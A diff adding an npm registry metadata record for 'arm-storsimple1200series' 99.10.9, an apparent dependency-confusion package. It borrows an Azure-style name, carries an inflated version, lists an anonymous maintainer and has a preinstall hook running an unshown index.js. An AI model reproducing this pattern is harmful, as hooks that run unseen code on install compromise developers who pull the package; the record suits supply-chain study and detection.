@@ -1,0 +1,62 @@
+{
+    "_id": "arm-storsimple1200series",
+    "name": "arm-storsimple1200series",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-storsimple1200series",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-storsimple1200series@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-HyYN/HTWPC6aBxySRlpuuaoNA5qJWlvBlInXnffrqN/MQIHSI4AF0J4Jy9XuJDcuqbzVPrMAjCDMndR4f+VEHA==",
+                "shasum": "2cc6809d2f46b5fca2a195f573fb627b9e9f4e2e",
+                "tarball": "https://registry.npmjs.org/arm-storsimple1200series/-/arm-storsimple1200series-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNaWQACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpYHA//TLO0+XB9l7AMQ7PPFaydpY31a1j1UamXNQfUJBcmeobLZJgL\r\nnSB4Fdowe6qBPWHGzOy5gJHD4V3Lo7dY9TkmcQ7+VREIdg69Z91agXCVp28w\r\noPLpSazViNWLPhOO9DEJiVVgeXeP3D2u7hKO+PPi9/aqv+kEkDe+HKTGH+zr\r\n+33OsYd3UvHeTtbapi0YIMBglyNAgMqTAdDBw6pZWa9rbtT8e3MWGAWwhP3f\r\nFbgfS9FDrZ1sRUlyq/RVk1hoU4xKI/GcSrS09F+g5jXIOICf8+y4hYU+3J45\r\noCdDNUZydUMVkUqS2naV1QoaToHKkyzqqyMfDO5AgWgrLB7nkxS80FBOx4Ed\r\nuh1W2wL5aR41SY5lv5fG0sSHppwnyzQ7xqdWXVM59CZsfh0uc7Ft04Ub4J4Q\r\n13jdlA3/k58JYLyOsiR8SE3vLPZHe26VDhtcYK8yVkT3P94To9STmVsAVHp7\r\nwfEcZXNVhWGmOEYwrXgGECPALBrfwC0w+I5y3HiNRBELYk7DvKtHbz1Fu+f+\r\nXf1wIxOypDi6FsXqNZcSCdDcPh8NY6na/x+mOBMyFCMxAu5enrz8MlWNn7EQ\r\nbjWWHnOltlI7rX/zlEsc4eCtLTMtehGLJ/fEZLMhDT380XWfTyVQzJ7XQE4a\r\n93yGjokbwHHoJva887gCG0iCXHqzVHzs/tI=\r\n=yyDi\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "4mqjoeb5",
+                "email": "4mqjoeb5@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "4mqjoeb5",
+                    "email": "4mqjoeb5@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-storsimple1200series_99.10.9_1647682959951_0.7422349943996731"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T09:42:39.950Z",
+        "99.10.9": "2022-03-19T09:42:40.128Z",
+        "modified": "2022-03-19T09:42:40.234Z"
+    },
+    "maintainers": [
+        {
+            "name": "4mqjoeb5",
+            "email": "4mqjoeb5@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
